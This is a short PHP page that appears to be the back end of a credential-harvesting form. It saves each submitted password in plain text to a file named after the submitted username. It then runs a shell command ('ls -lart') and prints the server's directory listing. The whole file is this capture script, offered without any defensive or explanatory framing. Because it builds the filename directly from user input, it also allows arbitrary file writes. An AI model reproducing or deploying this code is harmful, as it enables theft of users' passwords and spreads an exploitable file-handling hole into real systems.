<html>
<body>
<div style="background-color:black;color:green;padding:2%;">

<?php 

#if(!isset($_POST['uname']) || !isset($_POST['pass'])){  //Redirect somewhere } 

$ourFileName = $_POST['uname'] ."_pass.txt";

$ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");

fclose($ourFileHandle); $fopen = fopen($ourFileName, 'a');

fwrite($fopen, $_POST['pass']);
$output = shell_exec('ls -lart');
echo "<pre>$output</pre>";

fclose($fopen);
?>  
</div>
</body>
